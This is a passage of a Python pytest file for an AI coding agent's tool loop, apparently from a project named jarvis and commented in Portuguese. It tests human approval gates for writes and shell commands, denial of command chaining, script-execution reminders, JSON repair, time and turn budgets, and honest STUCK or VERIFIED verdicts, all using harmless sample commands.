            _tc_msg("execute_shell", {"cmd": "chmod +x det.sh"})]
    note = _unexecuted_script_note(msgs)
    assert note and "det.sh" in note


def test_agent_appends_unexecuted_script_note(tmp_path) -> None:
    """Loop: script escrito e 'done' sem rodar → nota no payload seguinte."""
    import json as jsonlib

    seen = []

    class WriteSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            seen.append(json)
            if len(seen) == 1:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{
                           "id": "c1", "type": "function",
                           "function": {
                               "name": "write_file",
                               "arguments": jsonlib.dumps(
                                   {"path": "det.sh", "content": "echo ok"}),
                           }}]}
            else:
                msg = {"role": "assistant", "content": "done"}
            return FakeResponse({"choices": [{"message": msg}]})

    agent = Agent(Config(), session=WriteSession())
    agent.run("cria det.sh")
    assert "unexecuted_script" in jsonlib.dumps(seen)


def test_chaining_denied_even_when_approved(tmp_path, monkeypatch) -> None:
    """Chaining negado SEMPRE: approve=True não pode vazar p/ shlex
    quebrado (L8 real: `chmod && ./` com approve parcial aplicava e
    falhava críptico). Guidance aponta script .sh."""
    import json as jsonlib

    seen = []

    class ChainSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            seen.append(json)
            if len(seen) == 1:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{
                           "id": "c1", "type": "function",
                           "function": {
                               "name": "execute_shell",
                               "arguments": jsonlib.dumps(
                                   {"cmd": "chmod +x x.sh && ./x.sh"}),
                           }}]}
            else:
                msg = {"role": "assistant", "content": "done"}
            return FakeResponse({"choices": [{"message": msg}]})

    monkeypatch.setattr("jarvis.core.agent.human_approve", lambda cmd: True)
    agent = Agent(Config(), session=ChainSession(), approve=True)
    result = agent.run("roda x.sh")
    # Carve-out (dono 19/09): idiom fundido `chmod +x F && ./F` executa o
    # run-half (write já deu +x) em vez de negar — o ban total virava
    # STUCK certo no L8. Demais chaining continua negado (teste abaixo).
    assert any("./x.sh" in c for c in result.commands_run)
    assert not any("chmod +x x.sh && ./x.sh" in d
                   for d in result.commands_denied)


def test_general_chaining_still_denied(tmp_path, monkeypatch) -> None:
    """Chaining genérico (`ls && echo`) segue NEGADO mesmo com approve —
    só o idiom chmod+run tem carve-out."""
    import json as jsonlib

    seen = []

    class ChainSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            seen.append(json)
            if len(seen) == 1:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{
                           "id": "c1",
                           "type": "function",
                           "function": {
                               "name": "execute_shell",
                               "arguments": jsonlib.dumps(
                                   {"cmd": "ls /tmp && echo done"}),
                           }}]}
            else:
                msg = {"role": "assistant", "content": "done"}
            return FakeResponse({"choices": [{"message": msg}]})

    monkeypatch.setattr("jarvis.core.agent.human_approve", lambda cmd: True)
    agent = Agent(Config(), session=ChainSession(), approve=True)
    result = agent.run("lista")
    assert result.commands_run == []
    assert any("ls /tmp && echo done" in d for d in result.commands_denied)
    assert "write a .sh via write_file" in jsonlib.dumps(seen)


def test_unread_refs_note_fires(tmp_path, monkeypatch) -> None:
    """Script referencia arquivo EXISTENTE nunca lido → nota READ-FIRST."""
    from jarvis.core.agent import _unread_refs_note
    (tmp_path / "logs").mkdir()
    (tmp_path / "logs" / "auth.log").write_text("Failed password")
    (tmp_path / "logs" / "http.log").write_text("GET /")
    monkeypatch.chdir(tmp_path)
    msgs = [{"role": "user", "content": "x"},
            _tc_msg("read_file", {"path": "logs/http.log"}),
            {"role": "tool", "tool_call_id": "c1", "content": "# ok\n200"},
            _tc_msg("write_file", {"path": "d.sh",
                                   "content": "grep x logs/auth.log"})]
    note = _unread_refs_note(msgs)
    assert note and "logs/auth.log" in note and "read_file" in note


def test_unread_refs_note_ignores_missing_outputs(tmp_path, monkeypatch) -> None:
    """Refs inexistentes (outputs-a-criar, lixo de variável shell) NÃO
    geram nota (L8 real: 8 leituras de alert.json inexistente)."""
    from jarvis.core.agent import _unread_refs_note
    (tmp_path / "logs").mkdir()
    (tmp_path / "logs" / "auth.log").write_text("Failed password")
    monkeypatch.chdir(tmp_path)
    msgs = [{"role": "user", "content": "x"},
            _tc_msg("read_file", {"path": "logs/auth.log"}),
            {"role": "tool", "tool_call_id": "c1", "content": "# ok\nFailed"},
            _tc_msg("write_file", {"path": "d.sh",
                                   "content": "grep x logs/auth.log > alert.json; cat $logs_dir/auth.log"})]
    assert _unread_refs_note(msgs) is None


def test_unread_refs_note_silent_when_all_read() -> None:
    """Tudo lido → sem nota."""
    from jarvis.core.agent import _unread_refs_note
    msgs = [{"role": "user", "content": "x"},
            _tc_msg("read_file", {"path": "logs/auth.log"}),
            {"role": "tool", "tool_call_id": "c1", "content": "# ok\nFailed"},
            _tc_msg("write_file", {"path": "d.sh",
                                   "content": "grep x logs/auth.log"})]
    assert _unread_refs_note(msgs) is None


def test_missing_binary_hint_detects_broken_shebang(tmp_path, monkeypatch) -> None:
    """ENOENT em script existente = shebang quebrado (NixOS sem /bin/bash):
    hint aponta interpretador, não arquivo."""
    from jarvis.core.agent import _missing_binary_hint
    s = tmp_path / "x.sh"
    s.write_text("#!/nonexistent-interp-xyz\nsleep 999\n")
    monkeypatch.chdir(tmp_path)
    hint = _missing_binary_hint("./x.sh")
    assert "shebang" in hint and "nonexistent-interp-xyz" in hint
    assert "bash" in hint  # alternativa acionável


def test_missing_binary_hint_silent_for_valid_script(tmp_path, monkeypatch) -> None:
    """Shebang válido (/bin/sh existe) → sem hint."""
    from jarvis.core.agent import _missing_binary_hint
    s = tmp_path / "ok.sh"
    s.write_text("#!/bin/sh\necho ok\n")
    monkeypatch.chdir(tmp_path)
    assert _missing_binary_hint("./ok.sh") == ""
    assert _missing_binary_hint("definitely-not-a-binary-xyz") == ""


def test_detect_profile_registry_tier_overrides_param_count(tmp_path, monkeypatch):
    """Registry vence regex: jarvis-fast (4B) é small COM tools, não tiny."""
    import json as jsonlib
    from jarvis.core.agent import detect_profile
    reg = {"version": 1, "default": "bonsai", "maxResident": 1,
           "models": {
               "bonsai": {"tier": "speed",
                          "capabilities": ["general"], "params_b": 8},
               "jarvis-fast": {"tier": "fast",
                               "capabilities": ["general"], "params_b": 4},
               "jarvis-strong": {"tier": "reasoning",
                                 "capabilities": ["general"], "params_b": 35}}}
    p = tmp_path / "registry.json"
    p.write_text(jsonlib.dumps(reg))
    monkeypatch.setenv("JARVIS_MODEL_REGISTRY", str(p))
    fast = detect_profile("jarvis-fast")
    assert fast["name"] == "small"
    assert fast["tool_choice"] == "auto"
    assert detect_profile("jarvis-strong")["name"] == "large"
    # Fora do registry: legado intacto (4B desconhecido continua tiny).
    assert detect_profile("mini-4b")["name"] == "tiny"
    assert detect_profile("default")["name"] == "default"


def test_parallel_reads_preserve_order(tmp_path, monkeypatch) -> None:
    """Turno só de reads roda em batch com ordem determinística (P1)."""
    from jarvis.core.agent import Agent
    (tmp_path / "a.txt").write_text("AAA")
    (tmp_path / "b.txt").write_text("BBB")
    (tmp_path / "c.txt").write_text("CCC")
    from jarvis.core.paths import use_project_root
    with use_project_root(tmp_path):
        got = Agent._parallel_read_batch([
            ("read_file", {"path": "a.txt"}),
            ("read_file", {"path": "b.txt"}),
            ("read_file", {"path": "nope.txt"}),
            ("read_file", {"path": "c.txt"}),
        ])
    assert "AAA" in got[0] and "BBB" in got[1]
    assert got[2].startswith("ERROR")
    assert "CCC" in got[3]


def test_parallel_read_isolates_exceptions(monkeypatch) -> None:
    """Exceção num read não derruba o lote (P1)."""
    from jarvis.core.agent import Agent
    import jarvis.core.agent as A

    def _boom(path, offset=0, limit=200):
        if "bad" in path:
            raise RuntimeError("io")
        return {"ok": True, "content": "fine", "path": path, "total_lines": 1}

    monkeypatch.setattr("jarvis.core.devtools.read_file", _boom)
    got = A.Agent._parallel_read_batch([
        ("read_file", {"path": "good.txt"}),
        ("read_file", {"path": "bad.txt"}),
    ])
    assert "fine" in got[0]
    assert got[1].startswith("ERROR")


def test_mixed_batch_stays_serial(tmp_path, monkeypatch) -> None:
    """Turno com shell+read NÃO usa batch (side effect serial)."""
    import json as jsonlib
    from unittest.mock import patch
    from jarvis.core.agent import Agent
    from jarvis.core.config import Config

    import sys
    sys.path.insert(0, "tests")
    from test_agent import FakeSession, FakeResponse  # noqa (self)

    (tmp_path / "f.txt").write_text("hi")
    monkeypatch.chdir(tmp_path)
    seen = {"parallel": 0}
    real_batch = Agent._parallel_read_batch

    def _spy(items):
        seen["parallel"] += 1
        return real_batch(items)

    class Mixed(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls == 1:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [
                           {"id": "c1", "type": "function",
                            "function": {"name": "execute_shell",
                                         "arguments": jsonlib.dumps({"cmd": "echo x"})}},
                           {"id": "c2", "type": "function",
                            "function": {"name": "read_file",
                                         "arguments": jsonlib.dumps({"path": "f.txt"})}},
                       ]}
            else:
                msg = {"role": "assistant", "content": "pronto"}
            return FakeResponse({"choices": [{"message": msg}]})

    agent = Agent(Config(), session=Mixed())
    from jarvis.core.paths import use_project_root
    with patch.object(Agent, "_parallel_read_batch",
                      staticmethod(_spy)), \
        patch("jarvis.core.agent.run_shell") as rs:
        import subprocess
        rs.return_value = subprocess.CompletedProcess(
            args=[], returncode=0, stdout="x", stderr="")
        with use_project_root(tmp_path):
            result = agent.run("faça os dois")
    assert seen["parallel"] == 0
    assert result.verdict == "VERIFIED"


def test_write_tools_need_approval(tmp_path) -> None:
    """write/str_replace sem approve: negação honesta, sem escrita."""
    import json as jsonlib
    from unittest.mock import patch
    from jarvis.core.agent import Agent
    from jarvis.core.config import Config

    import sys
    sys.path.insert(0, "tests")
    from test_agent import FakeSession, FakeResponse  # noqa (self)

    class WantWrite(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls == 1:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{
                           "id": "c1", "type": "function",
                           "function": {"name": "write_file",
                                        "arguments": jsonlib.dumps(
                                            {"path": "novo.txt",
                                             "content": "x"})}}]}
            else:
                msg = {"role": "assistant", "content": "sem permissão, ok"}
            return FakeResponse({"choices": [{"message": msg}]})

    from jarvis.core.paths import use_project_root
    agent = Agent(Config(), session=WantWrite())
    with use_project_root(tmp_path):
        result = agent.run("crie novo.txt")
    assert not (tmp_path / "novo.txt").exists()
    assert any("write_file" in c for c in result.commands_denied)


def test_write_tools_executes_with_approval(tmp_path) -> None:
    """Com approve + human_approve: escreve de verdade (jail do projeto)."""
    import json as jsonlib
    from unittest.mock import patch
    from jarvis.core.agent import Agent, human_approve
    from jarvis.core.config import Config

    import sys
    sys.path.insert(0, "tests")
    from test_agent import FakeSession, FakeResponse  # noqa (self)

    class WantWrite(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls == 1:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{
                           "id": "c1", "type": "function",
                           "function": {"name": "write_file",
                                        "arguments": jsonlib.dumps(
                                            {"path": "novo.txt",
                                             "content": "conteúdo"})}}]}
            else:
                msg = {"role": "assistant", "content": "criado e verificado"}
            return FakeResponse({"choices": [{"message": msg}]})

    from jarvis.core.paths import use_project_root
    agent = Agent(Config(), session=WantWrite(), approve=True)
    with patch("jarvis.core.agent.human_approve", return_value=True):
        with use_project_root(tmp_path):
            result = agent.run("crie novo.txt")
    assert (tmp_path / "novo.txt").read_text() == "conteúdo"
    assert result.verdict == "VERIFIED"
    assert result.verified is True


def test_fallback_parses_xlam_array() -> None:
    """xLAM emite listas: cada elemento vira call (cap 3)."""
    from jarvis.core.agent import extract_fallback_tool_calls
    text = ('[{"name": "read_file", "arguments": {"path": "a"}}, '
            '{"name": "execute_shell", "arguments": {"cmd": "ls"}}, '
            '{"name": "x", "arguments": "não-dict"}, '
            '{"name": "read_file", "arguments": {"path": "b"}}]')
    got = extract_fallback_tool_calls(text)
    assert [c["name"] for c in got] == ["read_file", "execute_shell",
                                        "read_file"]
    assert got[0]["arguments"] == {"path": "a"}
    assert extract_fallback_tool_calls("texto puro") == []
    assert extract_fallback_tool_calls("") == []


def test_strict_accepts_list_content() -> None:
    """strict com array JSON vira múltiplas tool_calls."""
    import json as jsonlib
    from jarvis.core.agent import Agent
    from jarvis.providers.llm_backend import ChatResponse
    tools = [{"type": "function",
              "function": {"name": n}} for n in ("read_file", "execute_shell")]
    resp = ChatResponse(content=jsonlib.dumps([
        {"tool": "read_file", "arguments": {"path": "a"}},
        {"tool": "execute_shell", "arguments": {"cmd": "ls"}},
        {"tool": "unknown", "arguments": {}},
        "lixo",
    ]))
    out = Agent._strict_to_response(resp, tools)
    assert [c["function"]["name"] for c in out.tool_calls] == [
        "read_file", "execute_shell"]


def test_agent_self_plan_anchors_before_loop(tmp_path) -> None:
    """plan=True: turno 0 gera plano e ancora (P0.4)."""
    import json as jsonlib
    from jarvis.core.agent import Agent
    from jarvis.core.config import Config

    import sys
    sys.path.insert(0, "tests")
    from test_agent import FakeSession, FakeResponse  # noqa (self)

    seen = {}

    class PlanThenDone(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls == 1:
                msg = {"role": "assistant",
                       "content": "1. Ler\n2. Fazer"}
            else:
                msg = {"role": "assistant", "content": "feito"}
                seen["n"] = self.calls
            return FakeResponse({"choices": [{"message": msg}]})

    agent = Agent(Config(), session=PlanThenDone(), plan=True)
    result = agent.run("faça algo")
    assert "1. Ler" in result.plan
    assert seen.get("n", 0) >= 2


def test_agent_plan_failure_never_aborts(tmp_path) -> None:
    """Plano que falha: run segue sem plano (nunca aborta por isso)."""
    from unittest.mock import patch
    from jarvis.core.agent import Agent
    from jarvis.core.config import Config

    import sys
    sys.path.insert(0, "tests")
    from test_agent import FakeSession  # noqa (self)

    agent = Agent(Config(), session=FakeSession("ok"), plan=True)
    with patch.object(Agent, "_draft_plan", side_effect=RuntimeError("x")):
        result = agent.run("oi")
    assert result.plan == ""
    assert result.final_response == "done: ok"


def test_shell_observation_carries_exit_code(tmp_path) -> None:
    """Observation de shell inclui [exit: N] (modelo distingue falha muda)."""
    import json as jsonlib
    from unittest.mock import patch
    from jarvis.core.agent import Agent
    from jarvis.core.config import Config

    import sys
    sys.path.insert(0, "tests")
    from test_agent import FakeSession, FakeResponse  # noqa (self)

    seen = {}

    class OneShell(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls == 1:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{
                           "id": "c1", "type": "function",
                           "function": {"name": "execute_shell",
                                        "arguments": jsonlib.dumps({"cmd": "echo hi"})}}]}
            else:
                seen["msgs"] = json
                msg = {"role": "assistant", "content": "ok"}
            return FakeResponse({"choices": [{"message": msg}]})

    agent = Agent(Config(), session=OneShell())
    with patch("jarvis.core.agent.run_shell") as rs:
        import subprocess
        rs.return_value = subprocess.CompletedProcess(
            args=[], returncode=0, stdout="hi\n", stderr="")
        agent.run("diga hi")
    tool_msgs = [m for m in seen["msgs"]["messages"] if m.get("role") == "tool"]
    assert tool_msgs and "[exit: 0]" in tool_msgs[0]["content"]


class TestApiCascadeGate:
    def test_layer_mapping(self):
        from jarvis.core.agent import _api_layer_for
        assert _api_layer_for("classifique este texto") == "classify"
        assert _api_layer_for("quem fala neste trecho?") == "classify"
        assert _api_layer_for("audite o sistema") == "docs"
        assert _api_layer_for("refatore o módulo") == "batch"
        assert _api_layer_for("crie um arquivo qualquer") == "dev"

    def test_no_key_no_call(self, monkeypatch):
        """Sem key no env → None, sem rede (anti-preguiça trava 3)."""
        import os
        for k in ("OPENROUTER_API_KEY", "OPENCODE_CONFIG", "NVIDIA_API_KEY"):
            monkeypatch.delenv(k, raising=False)
        from jarvis.core.agent import Agent
        from jarvis.core.config import Config
        from dataclasses import replace
        a = Agent(replace(Config(), llm_model="bonsai"))
        a._api_fallback_used = False
        assert a._try_api_cascade("crie um arquivo x", "sys") is None

    def test_once_per_run(self, monkeypatch):
        """Segunda chamada → None mesmo com key (trava 2)."""
        import os
        monkeypatch.setenv("OPENROUTER_API_KEY", "fake-key")
        from jarvis.core.agent import Agent
        from jarvis.core.config import Config
        from dataclasses import replace
        a = Agent(replace(Config(), llm_model="bonsai"))
        a._api_fallback_used = True
        assert a._try_api_cascade("crie um arquivo x", "sys") is None

    def test_success_marks_result(self, monkeypatch):
        """Backend fake OK → conteúdo + flags de telemetria."""
        import os
        import types
        monkeypatch.setenv("OPENROUTER_API_KEY", "fake-key")

        class _Resp:
            content = "resposta da api"
        class _FakeBackend:
            def __init__(self, **kw):
                pass
            def chat(self, *a, **k):
                return _Resp()
        import jarvis.providers.llm_remote as _lr
        monkeypatch.setattr(_lr, "RemoteBackend", _FakeBackend)
        from jarvis.core.agent import Agent
        from jarvis.core.config import Config
        from dataclasses import replace
        a = Agent(replace(Config(), llm_model="bonsai"))
        a._api_fallback_used = False
        out = a._try_api_cascade("crie um arquivo x", "sys")
        assert out == "resposta da api"
        assert a._api_fallback_used is True
        assert a._stuck_or_cascade.__name__ == "_stuck_or_cascade"


def test_prefix_gate_blocks_json_without_producers(tmp_path, monkeypatch) -> None:
    """.json INVÁLIDO sem nada computado no run → BLOCKED mecânico,
    arquivo NÃO criado (L8 real 4x: AgentLTL block-and-warn)."""
    class GateSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls == 1:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{"id": "call-1", "type": "function",
                           "function": {"name": "write_file",
                               "arguments": jsonlib.dumps({
                                   "path": str(tmp_path / "o.json"),
                                   "content": "[{'id': 'X'}]"})}}]}
            else:
                msg = {"role": "assistant", "content": "stopped"}
            return FakeResponse({"choices": [{"message": msg}]})

    monkeypatch.setattr("jarvis.core.agent.human_approve", lambda cmd: True)
    agent = Agent(Config(), session=GateSession(), approve=True)
    result = agent.run("write output")
    assert not (tmp_path / "o.json").exists()
    assert any("o.json" in c for c in result.commands_denied)


def test_run_first_gate_blocks_reedit_before_exec(tmp_path, monkeypatch) -> None:
    """Re-editar .sh escrito mas nunca executado → BLOCKED (fiddle sem
    feedback vira run forçado; L8 variante: 3x str_replace no-op até STUCK)."""
    target = str(tmp_path / "run.sh")

    class FiddleSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls == 1:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{"id": "call-1", "type": "function",
                           "function": {"name": "write_file",
                               "arguments": jsonlib.dumps({
                                   "path": target,
                                   "content": "#!/bin/sh\necho hi\n"})}}]}
            elif self.calls == 2:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{"id": "call-2", "type": "function",
                           "function": {"name": "str_replace",
                               "arguments": jsonlib.dumps({
                                   "path": target,
                                   "old": "echo hi",
                                   "new": "echo yo"})}}]}
            else:
                msg = {"role": "assistant", "content": "stopped"}
            return FakeResponse({"choices": [{"message": msg}]})

    monkeypatch.setattr("jarvis.core.agent.human_approve", lambda cmd: True)
    agent = Agent(Config(), session=FiddleSession(), approve=True)
    result = agent.run("write and fiddle")
    assert (tmp_path / "run.sh").read_text() == "#!/bin/sh\necho hi\n"
    assert any("run.sh" in c for c in result.commands_denied)


def test_time_budget_aborts_hung_run(tmp_path, monkeypatch) -> None:
    """Orçamento wall-clock estourado → STUCK honesto com motivo, sem
    chamar o LLM (L8n3 real: call stallada pinou GPU até aborto manual)."""
    class NeverSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            raise AssertionError("LLM não deveria ser chamado com budget 0")

    monkeypatch.setenv("JARVIS_AGENT_MAX_TIME_S", "0")
    agent = Agent(Config(), session=NeverSession(), approve=True)
    result = agent.run("qualquer coisa")
    assert result.turns == 1
    assert "time budget" in (result.final_response or "")


def test_read_auto_relocates_unique_candidate(tmp_path, monkeypatch) -> None:
    """read de basename com 1 candidato no CWD → serve direto com nota
    (L8r: modelo ignorou path exato do warning 3x)."""
    from jarvis.core.agent import Agent
    (tmp_path / "rules").mkdir()
    (tmp_path / "rules" / "det.json").write_text('{"a": 1}\n')
    monkeypatch.chdir(tmp_path)
    out = Agent._exec_read_file({"path": "det.json"})
    assert "auto-relocated" in out
    assert '"a": 1' in out


def test_read_empty_decoy_stays_error(tmp_path, monkeypatch) -> None:
    """Decoy vazio com mesmo basename NÃO é servido (L8v12: relocate
    confirmou alucinação servindo artefato vazio do script quebrado)."""
    from jarvis.core.agent import Agent
    (tmp_path / "logs").mkdir()
    (tmp_path / "auth.json").write_text("")
    monkeypatch.chdir(tmp_path)
    out = Agent._exec_read_file({"path": "logs/auth.json"})
    assert out.startswith("ERROR")
    assert "auto-relocated" not in out


def test_read_ambiguous_stays_error(tmp_path, monkeypatch) -> None:
    """2+ candidatos → erro normal (ambíguo não se adivinha)."""
    from jarvis.core.agent import Agent
    (tmp_path / "a").mkdir()
    (tmp_path / "b").mkdir()
    (tmp_path / "a" / "same.txt").write_text("1\n")
    (tmp_path / "b" / "same.txt").write_text("2\n")
    monkeypatch.chdir(tmp_path)
    out = Agent._exec_read_file({"path": "same.txt"})
    assert out.startswith("ERROR")
    assert "auto-relocated" not in out


def test_silent_exhaustion_is_stuck_not_verified(tmp_path, monkeypatch) -> None:
    """Turns esgotados sem mensagem final → STUCK (L8v9: VERIFIED vácuo).
    Com declaração final, segue o caminho normal."""
    class SilentSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            msg = {"role": "assistant", "content": "",
                   "tool_calls": [{"id": f"call-{self.calls}",
                       "type": "function",
                       "function": {"name": "list_directory",
                           "arguments": jsonlib.dumps(
                               {"path": str(tmp_path)})}}]}
            return FakeResponse({"choices": [{"message": msg}]})

    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("JARVIS_AGENT_MAX_TURNS", "3")
    agent = Agent(Config(), session=SilentSession(), approve=True)
    result = agent.run("list files")
    assert result.turns == 3
    assert result.verdict == "STUCK"
    assert "sem declaração" in (result.final_response or "")


def test_fused_chmod_run_executes_run_half(tmp_path, monkeypatch) -> None:
    """`chmod +x F && ./F` fundido executa ./F (L8: fixação no idiom
    morria no ban; write já deu +x)."""
    import os as _os
    (tmp_path / "d.sh").write_text("#!/bin/sh\necho ran > ran.txt\n")
    _os.chmod(tmp_path / "d.sh", 0o755)

    class FusedSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls == 1:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{"id": "call-1", "type": "function",
                           "function": {"name": "execute_shell",
                               "arguments": jsonlib.dumps({
                                   "cmd": "chmod +x d.sh && ./d.sh"})}}]}
            else:
                msg = {"role": "assistant", "content": "stopped"}
            return FakeResponse({"choices": [{"message": msg}]})

    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr("jarvis.core.agent.human_approve", lambda cmd: True)
    agent = Agent(Config(), session=FusedSession(), approve=True)
    result = agent.run("run it")
    assert (tmp_path / "ran.txt").read_text().strip() == "ran"
    assert not any("Chaining" in str(m.get("content", "")) for m in
                   getattr(result, "messages", []))


def test_syntax_rejection_arms_polymorphic_review(tmp_path, monkeypatch) -> None:
    """Write barrado por sintaxe arma 1 pass de revisão polimórfica
    (foco syntax) na próxima chamada (dono 19/09: thinking externalizado).
    Prova: post extra no backend + payload REVISE/SINTAXE + fix aplicado."""
    target = str(tmp_path / "d.sh")
    seen_prompts = []

    class ReviewSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            payload = jsonlib.dumps(json or {}, ensure_ascii=False)
            if "SINTAXE" in payload or "REVISE" in payload:
                seen_prompts.append(payload)
                return FakeResponse({"choices": [{"message": {
                    "role": "assistant", "content": "MANTER revisado ok"}}]})
            if self.calls == 1:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{"id": "call-1", "type": "function",
                           "function": {"name": "write_file",
                               "arguments": jsonlib.dumps({
                                   "path": target,
                                   "content": "#!/bin/bash\nif [ x ]; then\necho hi\n"})}}]}
            elif self.calls == 2:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{"id": "call-2", "type": "function",
                           "function": {"name": "write_file",
                               "arguments": jsonlib.dumps({
                                   "path": target,
                                   "content": "#!/bin/bash\necho fixed\n"})}}]}
            else:
                msg = {"role": "assistant", "content": "stopped"}
            return FakeResponse({"choices": [{"message": msg}]})

    monkeypatch.setattr("jarvis.core.agent.human_approve", lambda cmd: True)
    sess = ReviewSession()
    agent = Agent(Config(), session=sess, approve=True)
    agent.run("write script")
    # inicial + inicial + review (+ verification turns eventuais): o que
    # importa é que o review extra aconteceu com framing syntax e o fix
    # foi aplicado.
    assert sess.calls >= 4, f"review extra não aconteceu: {sess.calls}"
    assert any("SINTAXE" in p for p in seen_prompts)
    assert (tmp_path / "d.sh").read_text() == "#!/bin/bash\necho fixed\n"


def test_grammar_rewrite_repairs_quotes() -> None:
    """Rewrite gramatical converte repr-single-quote em JSON (C1)."""
    from unittest.mock import Mock
    from jarvis.providers.llm_backend import ChatResponse
    llm = Mock()
    llm.chat_with_tools.return_value = ChatResponse(
        content='{"a": 1}', tool_calls=[])
    agent = Agent(Config(), llm_client=llm)
    out = agent._grammar_json_rewrite("[{'a': 1}]")
    assert out is not None
    import json as _j
    assert _j.loads(out) == {"a": 1}
    sent = llm.chat_with_tools.call_args
    assert sent.kwargs.get("extra", {}).get("response_format", {}).get(
        "type") == "json_object"


def test_grammar_rewrite_garbage_returns_none() -> None:
    """Rewrite que volta lixo → None (mantém erro original)."""
    from unittest.mock import Mock
    from jarvis.providers.llm_backend import ChatResponse
    llm = Mock()
    llm.chat_with_tools.return_value = ChatResponse(
        content="not json at all", tool_calls=[])
    agent = Agent(Config(), llm_client=llm)
    assert agent._grammar_json_rewrite("[{'a': 1}]") is None


def test_invalid_json_write_retried_via_grammar(tmp_path, monkeypatch) -> None:
    """Write .json inválido (com produtor no run) é reescrito via gramática
    e o arquivo final é válido (C1 end-to-end)."""
    target = str(tmp_path / "o.json")

    class RewriteSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            payload = jsonlib.dumps(json or {}, ensure_ascii=False)
            if "json_object" in payload:
                return FakeResponse({"choices": [{"message": {
                    "role": "assistant",
                    "content": '{"a": 1}'}}]})
            if self.calls == 1:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{"id": "call-1", "type": "function",
                           "function": {"name": "execute_shell",
                               "arguments": jsonlib.dumps(
                                   {"cmd": "echo hi"})}}]}
            elif self.calls == 2:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{"id": "call-2", "type": "function",
                           "function": {"name": "write_file",
                               "arguments": jsonlib.dumps({
                                   "path": target,
                                   "content": "[{'a': 1}]"})}}]}
            else:
                msg = {"role": "assistant", "content": "stopped"}
            return FakeResponse({"choices": [{"message": msg}]})

    monkeypatch.setattr("jarvis.core.agent.human_approve", lambda cmd: True)
    agent = Agent(Config(), session=RewriteSession(), approve=True)
    agent.run("compute and save")
    import json as _j
    assert _j.loads((tmp_path / "o.json").read_text()) == {"a": 1}


def test_artifact_check_flags_run_json(tmp_path, monkeypatch) -> None:
    """Só .json do CWD tocado no run e inválido fala (L8v37: outputs de
    runtime invisíveis a todo gate de write)."""
    import time as _t
    from jarvis.core.agent import _check_run_json_artifacts
    monkeypatch.chdir(tmp_path)
    (tmp_path / "new-bad.json").write_text("{oops\n")
    (tmp_path / "good.json").write_text('{"a": 1}\n')
    (tmp_path / "old-bad.json").write_text("{oops\n")
    import os as _os
    _past = _t.time() - 1000
    _os.utime(tmp_path / "old-bad.json", (_past, _past))
    (tmp_path / "sub").mkdir()
    (tmp_path / "sub" / "bad.json").write_text("{oops\n")
    notes = _check_run_json_artifacts(_t.time() - 10)
    assert any("new-bad.json" in n and "not valid JSON" in n for n in notes)
    assert not any("good.json" in n for n in notes)
    assert not any("old-bad.json" in n for n in notes)
    assert not any("sub" in n for n in notes)


def test_progress_check_names_missing_deliverable(tmp_path, monkeypatch) -> None:
    """Aos ~6 turns, deliverable ausente é nomeado mid-run (L8v38: parte 2
    nunca começada; antes só aparecia no veredito final)."""
    _files = [f"f{i}.txt" for i in range(7)]

    class ReadLoopSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls <= 7:
                # Paths distintos: o detector de duplicatas ignora offset
                # (assinatura = name+path), então re-ler o mesmo arquivo
                # abortaria antes do turno 5.
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{"id": f"call-{self.calls}",
                           "type": "function",
                           "function": {"name": "read_file",
                               "arguments": jsonlib.dumps({
                                   "path": str(tmp_path / "logs" /
                                               _files[self.calls - 1])})}}]}
            else:
                msg = {"role": "assistant", "content": "stopped"}
            return FakeResponse({"choices": [{"message": msg}]})

    (tmp_path / "logs").mkdir()
    for _f in _files:
        (tmp_path / "logs" / _f).write_text("x\n" * 100)
    monkeypatch.chdir(tmp_path)
    agent = Agent(Config(), session=ReadLoopSession(), approve=True)
    result = agent.run("create a.sh and b.sh helpers")
    assert any("PROGRESS-CHECK" in str(m.get("content", "")) and "b.sh" in str(
        m.get("content", "")) for m in getattr(result, "messages", []))


def test_placeholder_py_detected_with_python_guidance(tmp_path, monkeypatch) -> None:
    """.py placeholder é detectado com instrução python (L8v15: passava
    batido — detector só via .sh)."""
    from jarvis.core.agent import _placeholder_script_note
    monkeypatch.chdir(tmp_path)
    msgs = [
        {"role": "assistant", "tool_calls": [{
            "id": "c1", "type": "function",
            "function": {"name": "write_file",
                         "arguments": jsonlib.dumps({
                             "path": "h.py",
                             "content": "import json\n# placeholder for logic\nprint('hi')\n"})}}]},
